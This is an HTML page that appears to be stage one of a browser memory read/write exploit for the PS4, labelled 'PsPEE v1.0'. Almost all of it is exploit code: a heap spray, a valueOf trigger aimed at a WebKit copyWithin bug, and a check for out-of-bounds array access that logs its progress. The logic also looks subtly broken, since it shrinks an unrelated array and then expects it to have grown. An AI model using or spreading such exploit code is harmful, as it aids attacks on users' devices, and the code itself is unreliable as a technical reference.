<!DOCTYPE html>
<html>
<head>
    <style>
        #output {
            font-family: monospace;
            white-space: pre-wrap;
            background-color: #111;
            color: #0f0;
            padding: 10px;
            border-radius: 5px;
            margin-top: 20px;
            width: 100%;
            height: 300px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div id="output"></div>
    <script>
        function logToDiv(msg) {
            document.getElementById('output').textContent += msg + "\n";
        }

        logToDiv("[*] PsPEE v1.0 - Memory R/W exploit stage 1 (PS4)");

        // Spray some arrays to stabilize memory layout
        let spray = [];
        for (let i = 0; i < 100; i++) {
            spray.push(new ArrayBuffer(0x1000));
        }

        // Prepare two overlapping TypedArrays (OOB)
        let oobArray = new Float64Array(8);
        let victimArray = [1.1, 1.2, 1.3];
        let container = {
            obj: victimArray
        };

        // Create a proxy that triggers the bug
        let trigger = {
            valueOf() {
                logToDiv("[+] Triggering copyWithin underflow...");
                victimArray.length = 1;  // Shrink it
                return -0x1000000;       // Large negative
            }
        };

        try {
            // This triggers `genericTypedArrayViewProtoFuncCopyWithin` bug
            oobArray.copyWithin(0, trigger);
            logToDiv("[+] Bug triggered (no crash = good)");
        } catch (e) {
            logToDiv("[-] Exploit failed: " + e.message);
        }

        // Check if we can corrupt the victimArray
        if (victimArray.length > 3) {
            logToDiv("[!!!] OOB access achieved!");
            for (let i = 0; i < 10; i++) {
                logToDiv("victim[" + i + "] = " + victimArray[i]);
            }
        } else {
            logToDiv("[-] No OOB access. Need to retune memory layout.");
        }
    </script>
</body>
</html>
